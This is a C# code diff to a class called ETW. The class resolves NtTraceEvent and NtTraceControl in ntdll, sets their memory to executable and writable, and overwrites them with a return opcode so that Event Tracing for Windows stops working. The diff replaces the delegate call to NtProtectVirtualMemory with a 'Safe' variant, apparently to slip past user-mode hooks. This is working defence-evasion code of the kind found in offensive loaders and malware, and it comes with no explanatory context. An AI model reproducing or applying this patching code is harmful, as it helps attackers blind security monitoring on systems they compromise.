@@ -11,7 +11,7 @@ namespace Offline.Special
 {
     internal static class ETW
     {
-        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        /*[UnmanagedFunctionPointer(CallingConvention.Winapi)]
         unsafe delegate NtStatus NtProtectVirtualMemory
             (
                 IntPtr ProcessHandle,
@@ -27,7 +27,7 @@ namespace Offline.Special
         {
             IntPtr ntVirtualProtect = Resolver.GetExportAddress("ntdll.dll", "NtProtectVirtualMemory");
             ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntVirtualProtect, typeof(NtProtectVirtualMemory));
-        }
+        }*/
 
         private static bool Patch(ref IntPtr address)
         {
@@ -66,14 +66,14 @@ namespace Offline.Special
 
             if (address != IntPtr.Zero)
             {
-                NtStatus n = ntProtectVirtualMemory((IntPtr)(-1), ref address, ref sizeHookCode, PageAccessType.PAGE_EXECUTE_READWRITE, ref flOld);
+                NtStatus n = ntProtectVirtualMemorySafe((IntPtr)(-1), ref address, ref sizeHookCode, PageAccessType.PAGE_EXECUTE_READWRITE, ref flOld);
 
                 if (n != NtStatus.Success)
                     return false;
 
                 Marshal.Copy(retOpcode, 0, address, retOpcode.Length);
 
-                n = ntProtectVirtualMemory((IntPtr)(-1), ref address, ref sizeHookCode, flOld, ref flOldLast);
+                n = ntProtectVirtualMemorySafe((IntPtr)(-1), ref address, ref sizeHookCode, flOld, ref flOldLast);
 
                 if (n != NtStatus.Success)
                     return false;
@@ -85,7 +85,7 @@ namespace Offline.Special
 
         internal static bool BlockIt()
         {
-            PrepareDelegate();
+            //PrepareDelegate();
 
             IntPtr ntTraceEvent = Resolver.GetExportAddress("ntdll.dll", "NtTraceEvent");
             IntPtr ntTraceControl = Resolver.GetExportAddress("ntdll.dll", "NtTraceControl");
